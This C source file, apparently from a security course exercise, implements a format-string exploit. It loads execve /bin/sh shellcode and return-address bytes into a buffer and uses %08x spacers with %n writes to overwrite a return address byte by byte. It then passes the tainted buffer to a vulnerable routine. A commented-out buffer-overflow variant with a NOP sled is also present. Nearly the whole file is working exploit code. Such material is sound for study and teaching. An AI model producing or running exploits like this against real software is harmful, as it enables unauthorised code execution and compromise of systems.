/*
 * attack.c
 *
 *  Created on: Oct 20, 2017
 *      Author: root
 */
/*
 * attack.c
 *
 *  Created on: Oct 20, 2017
 *      Author: root
 */

/*
 * formatstringtester.c
 *
 *  Created on: Sep 21, 2016
 *      Author: Reuben Johnston
 */
#include <string.h>

int real_main(int argc, char *argv[]);

typedef int bool;
#define true 1
#define false 0

#define DEBUG 1
#define FORMATBUFFERSIZE 2048

union
{
    unsigned long int integer;
    unsigned char byte[4];
} intUnion;

union
{
    unsigned short int shortinteger;
    unsigned char byte[1];
} shortUnion;


char shellcode[] = \
"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0a\x04\x01\xcd\x80\x90";//this shellcode has x3 NOPs for padding, length=28

//This spacer is for arbitary write
char spacer[] = \
"%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.";//This spacer was altered from what is present in the complete version of the exploit

/* This spacer is for arbitary read
 char spacer[] = \
"%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.";
 */

char spacer1[] = \
"%08x.";

char modifier[] = \
		"%n";

int main(int argc, char *argv[]) {
    int ret = 0;
    char taintedbuf[4096] __attribute__ ((aligned (8)));
    unsigned long int shellcodeaddr, retfptraddr;
    int taintedbufWritePtr, taintedbufWriteCnt=0;

    if (argc == 3) {
       sscanf(argv[1],"%lx",&shellcodeaddr);
        sscanf(argv[2],"%lx",&retfptraddr);
    }
     else
    {
        //To prompt user for program arguments in eclipse, use ${string_prompt:shellcodeaddr:0xffffac40} ${string_prompt:retfptraddr:0xffffbc5c}
        printf("warning, incorrect args.  need to enter argv[1]=shellcodeaddr and argv[2]=retfptraddr\n");
        return (-1);
    }

    printf("shellcodeaddr=0x%lx, retfptraddr=0x%lx\n",shellcodeaddr, retfptraddr);
    memset(taintedbuf,0,sizeof(taintedbuf));//clear the buffer

//=============================================================================================================
/* Buffer Overflow Exploit:
 * -----------------------
	int j=0; int i=0;
	strcpy(taintedbuf, "\x90");
	for(j=0;j<1999;j++)
	{
		strcat(taintedbuf, "\x90");
	}
	strcat(taintedbuf, shellcode);
	taintedbufWritePtr = strlen(taintedbuf);
	for(i=0; i<15; i++)
	{
	intUnion.integer=(retfptraddr);
	taintedbuf[taintedbufWritePtr+3]=intUnion.byte[3];
	taintedbuf[taintedbufWritePtr+2]=intUnion.byte[2];
	taintedbuf[taintedbufWritePtr+1]=intUnion.byte[1];
	taintedbuf[taintedbufWritePtr]=intUnion.byte[0];
	taintedbufWritePtr+=4;
	}
*/
//=============================================================================================================
//Following code is for the arbitary write and read
	int a; int b; int c; int p; int q; int r; int x; int y; int i; int j;

	    printf("\nThe length of spacer buffer is: %d\n", strlen(spacer));


		strcpy(taintedbuf, shellcode); //Shellcode loaded onto the stack

		strcat(taintedbuf, "AAAABBBBCCCC"); //Padding

		//Return address loaded onto the stack
		taintedbufWritePtr = strlen(taintedbuf);

		intUnion.integer=(retfptraddr);
		taintedbuf[taintedbufWritePtr+3]=intUnion.byte[3];
		taintedbuf[taintedbufWritePtr+2]=intUnion.byte[2];
		taintedbuf[taintedbufWritePtr+1]=intUnion.byte[1];
		taintedbuf[taintedbufWritePtr]=intUnion.byte[0];
		taintedbufWritePtr+=4;

		intUnion.integer=(retfptraddr+1);
		taintedbuf[taintedbufWritePtr+3]=intUnion.byte[3];
		taintedbuf[taintedbufWritePtr+2]=intUnion.byte[2];
		taintedbuf[taintedbufWritePtr+1]=intUnion.byte[1];
		taintedbuf[taintedbufWritePtr]=intUnion.byte[0];
		taintedbufWritePtr+=4;

		intUnion.integer=(retfptraddr+2);
		taintedbuf[taintedbufWritePtr+3]=intUnion.byte[3];
		taintedbuf[taintedbufWritePtr+2]=intUnion.byte[2];
		taintedbuf[taintedbufWritePtr+1]=intUnion.byte[1];
		taintedbuf[taintedbufWritePtr]=intUnion.byte[0];
		taintedbufWritePtr+=4;

		intUnion.integer=(retfptraddr+3);
		taintedbuf[taintedbufWritePtr+3]=intUnion.byte[3];
		taintedbuf[taintedbufWritePtr+2]=intUnion.byte[2];
		taintedbuf[taintedbufWritePtr+1]=intUnion.byte[1];
		taintedbuf[taintedbufWritePtr]=intUnion.byte[0];
		taintedbufWritePtr+=4;
//Modifying the return address bytes one by one========================================================
		strcat(taintedbuf, spacer);
		//Changing First byte of the return address
		for(a=0;a<201;a++)
				{
					strcat(taintedbuf,"A");
				}

		strcat(taintedbuf, modifier);
		//Changing Second byte of the return address
		for(a=0;a<74;a++)
				{
					strcat(taintedbuf,"A");
				}
		strcat(taintedbuf, modifier);
		//Changing Third byte of the return address
		for(a=0;a<45;a++)
				{
					strcat(taintedbuf,"A");
				}
		strcat(taintedbuf, modifier);
		//Changing Fourth byte of the return address
		for(a=0;a<192;a++)
				{
					strcat(taintedbuf,"A");
				}
		strcat(taintedbuf, modifier);
//====================================================================================================
    argc=2;//real_main's argc should only be 2
    argv[1]=taintedbuf;//real_main's argv[1] is the buffer to be written to usagefile
    ret = real_main(argc, argv);

    return (ret);
}



